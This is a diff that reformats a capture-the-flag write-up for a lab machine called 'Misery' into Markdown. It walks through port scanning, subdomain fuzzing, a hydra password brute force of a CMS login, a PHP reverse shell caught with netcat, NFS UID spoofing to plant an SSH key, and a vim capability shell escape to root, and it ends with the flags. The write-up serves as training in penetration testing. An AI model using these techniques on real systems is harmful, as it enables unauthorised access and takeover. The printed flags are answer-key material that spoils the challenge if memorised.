@@ -1,5 +1,7 @@
-Misery
+# Misery
 
+## Enumeration
+```bash
 └─$ nmap -sV -A -p- -sC -T4 10.10.199.139 -oX nmap.out
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-25 00:33 BST
 Nmap scan report for 10.10.199.139
@@ -18,7 +20,11 @@ PORT      STATE SERVICE  VERSION
 2049/tcp  open  nfs      2-4 (RPC #100003)
 35471/tcp open  nlockmgr 1-4 (RPC #100021)
 Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
+### At this point I was disapointed because I had found nothing so I check the subdomain (I nver do this before)
+
+```bash
 └─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://ohthemisery.thm' -H "Host:FUZZ.ohthemisery.thm" --hc 302 
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
@@ -50,7 +56,13 @@ ID           Response   Lines    Word       Chars       Payload
 000059348:   200        79 L     359 W      4711 Ch     "sion"                                               
 000080504:   200        79 L     359 W      4690 Ch     "zac"                                                
 000079252:   200        79 L     359 W      4711 Ch     "sona"
+```
 
+### The good subdomain was jinx and there were a cms service on it so I brute force it
+
+## Exploitation
+
+```bash
 └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt jinx.ohthemisery.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -t 64
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -63,11 +75,21 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-03 19:38:
 [80][http-post-form] host: jinx.ohthemisery.thm   login: admin   password: canon
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-03 19:42:14
+```
+### Once connected, I upload the prentest-monkey.php reverse shell
+```bash
+nc -lnvp 4444
+```
+### I got a shell as jinx
 
-upload pentest-monkey.php -> nc -lnvp 4444
+## User FLAG
 
-cat user.txt = EPI{V0l4TIlE_expL05IVe2_r_4_9irL_8e5T_PHriENd!}
+```cat user.txt``` : EPI{V0l4TIlE_expL05IVe2_r_4_9irL_8e5T_PHriENd!}
 
+## Privilege Escalation
+### I follow a write up and I did something really cursed to get a shell as another user
+
+```bash
 └─$ sudo adduser jinx --home /home/jinx --shell /bin/bash --uid 6666
 
 mount -t nfs :/home/jinx /mountpoint
@@ -75,20 +97,18 @@ mount -t nfs :/home/jinx /mountpoint
 ssh-keygen jinx -f
 
 cat key.pub > .ssh/authorized_keys
+```
+### Reverse the binary "hex" for read the vi ssh private key
 
-connect ssh with jinx
-
-reverse the binary "hex" for read the vi ssh private key
-
-connect with it -> linpeas -> vim.basic capabilities
-
- /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+### Connect with it -> linpeas -> vim.basic capabilities
+```bash
+/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
  
- cd /root
- 
- cat `ls`
- 
- root flag = EPI{0H_wA17_n0_7h3R3_12_jU57_73h_harD_WaY}
+cd /root
+```
+## Root FLAG
+
+```cat `ls` ```: = EPI{0H_wA17_n0_7h3R3_12_jU57_73h_harD_WaY}
 
 
 
